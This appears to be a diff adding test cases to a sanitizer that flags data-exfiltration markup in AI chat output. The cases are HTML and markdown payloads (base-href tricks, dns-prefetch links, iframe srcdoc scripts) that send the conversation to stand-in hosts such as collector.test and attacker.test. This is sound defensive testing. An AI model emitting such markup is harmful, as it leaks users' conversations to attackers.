@@ -671,6 +671,19 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             [],
         ),
         ("<a href='java script:alert(1)'>x</a>", []),
+        (
+            "<div><select><base href=''></select><base href='https://collector.test/'><img src='/{c}.png'></div>",
+            ["uncheckable_markup"],
+        ),
+        (
+            "<base href='https://docs.test/'><link rel='dns-prefetch' href=' https:///{conversation}.collector.test'>",
+            ["exfiltration_query"],
+        ),
+        ("<iframe sandbox srcdoc='&lt;script src=&quot;https://collector.test/{c}.js&quot;&gt;&lt;/script&gt;'>", []),
+        (
+            "<iframe sandbox srcdoc='&lt;svg&gt;&lt;script href=&quot;https://collector.test/{c}.js&quot;/&gt;&lt;/svg&gt;'>",
+            [],
+        ),
         ("<a href='java\u200bscript:alert(1)'>x</a>", []),
         ("<a href='java\u00a0script:alert(1)'>x</a>", []),
         ("<a href=' \x01javascript:alert(1)\x1f '>x</a>", ["script_uri"]),
